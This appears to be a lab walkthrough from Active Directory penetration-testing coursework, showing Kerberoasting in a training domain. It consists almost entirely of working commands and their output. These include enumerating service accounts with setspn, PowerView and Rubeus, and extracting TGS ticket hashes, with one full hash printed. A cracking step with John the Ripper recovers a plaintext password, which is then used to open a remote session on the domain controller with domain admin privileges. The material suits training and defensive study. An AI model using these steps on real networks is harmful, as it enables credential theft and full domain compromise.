#### Theory can be found in [[2. Domain Privilege Escalation#2. Kerberoast]] ####

- Find Kerberoastable users (services that run on behalf of user accounts in the AD, not computer accounts).
1. Enum1 - Built-in tools `setspn.exe`
```
PS C:\AD\MyTools> setspn.exe -Q */* | Select-String "CN=Users"

CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
CN=krbtgt,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

2. Enum2 - `PowerView.ps1`
```
PS C:\AD\MyTools> Get-DomainUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
websvc         {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin       {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

3. Enum3 - `Rubeus.exe`
```
PS C:\AD\MyTools> .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : dollarcorp.moneycorp.local
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


 -------------------------------------
 | Supported Encryption Type | Count |
 -------------------------------------
 | RC4_HMAC_DEFAULT          | 2     |
 -------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 2     |
 ----------------------------------
```

- Kerberoast
1. Abuse1 - Request the TGSs with `PowerView.ps1`
```
PS C:\AD\MyTools> Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"


SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$66E7C4B0908B302E2DD07AFFD699785E$4045747A85A11971E87B98CC04F7948900799B306170D4D57863492C64E00112407736EAF9DED9A5E5BFFBEDB6AAB24133276FE5C271D449B2DCC645DB814D087D7757A0778BFC2057C0F5F214EEB3EFAD39F2B3121BE1AB4B98CD36C8E1995F96ACEC6FD46529F9F816A44D0EDC9F6086056DCFAA0A3F1259BAB5C4B9614F4642A989775B28BC28AC5D4478A52E07C296CFAD186290D5C13340226A1C5AA640F5E0711C9386D13A1174FB882B8D2E9969E755268F2B8D562750BB89DCD183312B334710B7FBC038C30467724E9839467CC50D694B6622B5DF83C809D3F4889BC8C085D55B5B7C970A87E566B1AA3835F8457C07660048A1336649802FBD6612158871F977BA9C596F5401691CC215BE3900365B9D7E0351ED7312AA0068444EE9EFC9085FE9AA7F485D737E7BECFEEFA918F4747627CF4BA73E79016036C9621F6AB9AAC759C5ADC39DC64BBD51CE30718D602F0E92C124045D3964518D0AFC113B498BF3E391EF3CB4EE76A562D944531BDDDFFA27679BC31ADDF3BECEB31E73A4F83D09473E49AE782312C6866AA30498F8B6E611E83B0B1BFFD3842FE49D4318E85FFE48485AF6BA09EB090BABBC14E239F8E43721E9AAA2398271FAD542FB8C71B7BBFDAC3D6D3F68E95C2C73BB5EE75E7179A7D77C4E763F34BCB15085D68F7DB7E4B7B7A18EDB5AEB98B4323BF7BBEB864E805C4023E1CACC4A7151DE8A56B5B574D273A3D3938CD212C3FDD3DA220E97929B1D6831683FD5E661D1327CBD3312FD98D55BEFBFBDF3215423D624D23FAB02E8C867BEF9C4C3996138208C2991BCE1874513A0AE69DC9DC0EFF7A0592A0E7A84C2180307E70928157620AC15977AF3C3218DA8F830CE96D91D13367A0F312E519A5942507DD133EF3D07C5BC0BFE4B82EFFB84AA68F94B42BC0EBF33479BD0D0698C8EE6C1AAA87B82C0BEFDAB14DD44E7C10BD969A6F3FCE462E87BFE44643C09547942077EFC58E69F2496DA1FAACABC9F840F7377648FDE40EBE297E3CC02BA7E02921A697E757B94AA81473291796BA531DBC64F07ADD74DBE4621D5B5108743C2C3E079E8297169EA901412AB8F573D57CA17C6B5F8CFED53A44B1F63E3191A8F4C55DA00A27002F36A404DA33928DD2EC99CF2215738F5B62945E4FAC150714CFFE53D8DA1E462C71F36DA38CB79E46BE7F774B63D1800FE884571EC5ACA0170DF677DCB67563EE50A6D51B05C62F6B066DCC5004329C461DEE50539AC9C176DC68900A05B398AF1663B61D5A88E3A7E8A1AD3DAF5302BFF7A0120707066C54A3588F762A3D81C4479DE4570FEB1B08A61E555055955CD0E6BC883FDFE4487206ABABD84939B9487290F7CD106F723EC6BB94722114FD274ECB8A6077F06B97AEF7766D4E34EF1959D6B907521E865E9830A767F96F4A26B72CDA9B38F4E247CD2C972444C9065EB24D7BBD872D9354A44F29992F6AD522F84E0F7EB9BC2127920DB2694088D71D52EC1AB92D64F0ACE618A59F961E656FFF656458B12A8B93361B92C0E8D0CDD0176F75FB277B57624D141472E110082B5E4ED6739BE82C64D25D12D5200732708F52A88D13747D2481E3AB697BEEE00B957B2D9A7FE52FC11708E3C24D5406DB08B9A113F8A009360413356F5EBDF87A52048C50AE9B40C944AFFB6B2

PS C:\AD\MyTools> Get-DomainUser * -SPN | Get-DomainSPNTicket | Select-Object -Property Hash | Format-Table -Wrap
```

2. Abuse2 - Request the TGSs with `Rubeus.exe`
```
PS C:\AD\MyTools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : dollarcorp.moneycorp.local
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : websvc
[*] DistinguishedName      : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
[*] ServicePrincipalName   : SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL
[*] PwdLastSet             : 11/14/2022 4:42:13 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\AD\MyTools\hashes.kerberoast


[*] SamAccountName         : svcadmin
[*] DistinguishedName      : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433
[*] PwdLastSet             : 11/14/2022 9:06:37 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\AD\MyTools\hashes.kerberoast

[*] Roasted hashes written to : C:\AD\MyTools\hashes.kerberoast
```

- We could request TGSs only for user accounts that have administrative rights.
`PS C:\AD\MyTools> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`

- We could perform a targeted Kerberoast as well.
`PS C:\AD\MyTools> .\Rubeus.exe kerberoast /user:websvc /outfile:hashes.kerberoast`

3. Abuse3 - Request the TGSs with `Invoke-Kerberoast.ps1`
```
PS C:\AD\MyTools> ipmo .\Invoke-Kerberoast.ps1
PS C:\AD\MyTools> Invoke-Kerberoast | Select-Object -Property Hash | Format-Table -Wrap | Out-File .\kerberoast.txt
```

- Crack the TGSs with John the Ripper.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# john kerberoast.csv --wordlist=10k-worst-pass.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!! (?)     
1g 0:00:00:00 DONE (2023-08-10 08:45) 50.00g/s 500450p/s 602850c/s 602850C/s 1fuck..eyphed
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- `dcorp\svcadmin` is a DA.
```
PS C:\AD\MyTools> $svcadminpasswd = ConvertTo-SecureString -AsPlainText -Force -String "*ThisisBlasphemyThisisMadness!!"
PS C:\AD\MyTools> $svcadmincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\svcadmin",$svcadminpasswd
PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential $svcadmincred
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```